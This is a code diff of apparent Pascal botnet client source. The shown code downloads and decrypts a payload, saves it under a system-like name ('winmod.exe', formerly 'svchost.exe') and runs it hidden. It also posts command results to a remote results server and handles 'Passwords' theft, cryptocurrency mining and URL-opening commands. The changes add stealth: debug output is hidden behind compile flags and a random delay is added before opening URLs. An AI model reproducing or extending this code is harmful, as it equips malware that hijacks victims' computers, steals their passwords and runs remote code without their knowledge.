@@ -61,12 +61,12 @@ Begin
     DownloadFile(URL, MS);
     ToggleCrypt(MS, 7019);
     if Drop then Begin
-      MS.SaveToFile('svchost.exe');
+      MS.SaveToFile('winmod.exe');
       Sleep(2000);
-      if FileExists('svchost.exe') then Begin
+      if FileExists('winmod.exe') then Begin
          M:=TProcess.Create(Nil);
         try
-          M.Executable:='svchost.exe';
+          M.Executable:='winmod.exe';
           M.Parameters.Add(Params);
           M.ShowWindow:=swoHIDE;
           M.Execute;
@@ -92,6 +92,7 @@ var
   J: LongInt;
   Found: Boolean;
 Begin
+  Result:=0;
   Found:=False;
   For J:=Low(Workers) to High(Workers) do
   if Not(Assigned(Workers[J])) then Begin
@@ -151,7 +152,10 @@ Begin
   _ToPost.AddFormField('ID', AbortID);
   _ToPost.AddFormField('RT', '1');
   _ToPost.AddFormField('Result', 'Abort successful.');
-  Writeln('[',FIndex,'] ABORT-POST --> ',Hat.Post(Server+ResultsPHP, _ToPost));
+  Hat.Post(Server+ResultsPHP, _ToPost);
+  {$IFDEF Debug}
+  Writeln('[',FIndex,'] ABORT');
+  {$ENDIF}
   _ToPost.Free;
   Terminate;
 end;
@@ -173,7 +177,7 @@ var
   STemp, STemp2: String;
 
   procedure DoPost;
-  var Q: String;
+  var {%H-}Q: String;
   Begin
     ToPost.AddFormField('GUID', ID);
     ToPost.AddFormField('ID', FCmdID);
@@ -182,7 +186,9 @@ var
      Q:=Hat.Post(Server+ResultsPHP, ToPost);
     except
     end;
+    {$IFDEF Debug}
     Writeln('[',FIndex,'] CMD-POST --> ',Q);
+    {$ENDIF}
     ToPost.Clear;
   end;
 
@@ -319,7 +325,7 @@ Begin
             ToPost.AddFormField('Result', 'Execution successful.');
             ToPost.AddFormField('Continue', 'True');
             DoPost;
-            While Not(Terminated) do Begin
+            While (Not(Terminated)) and (Master.Running) do Begin
               Sleep(100);
             end;
             RemoveProcessFromList(Master.ProcessID);
@@ -466,7 +472,7 @@ Begin
         on E: Exception do
           ToPost.AddFormField('Result', 'Mining exception: '+E.Message);
       end;
-      ChDel('svchost.exe');
+      ChDel('winmod.exe');
       DoPost;
     end;
     'Passwords': Begin
@@ -490,6 +496,7 @@ Begin
       ChDel('P.html');
     end;
     'OpenURL': Begin
+      Sleep(Random(5*60*1000)+1);
       ToPost.AddFormField('RT', '1');
       OpenURL(Net.Commands.ReadString(FCmdID, 'URL', 'http://google.com'));
       ToPost.AddFormField('Result', 'URL opened successfully.');
@@ -531,7 +538,9 @@ Begin
       DoPost;
     end;
   end;
+  {$IFDEF Debug}
   Writeln('Thread [',FIndex,'] exited.');
+  {$ENDIF}
   Sleep(1000); //Used to prevent the client from accidentally performing the same command again
 end;
 
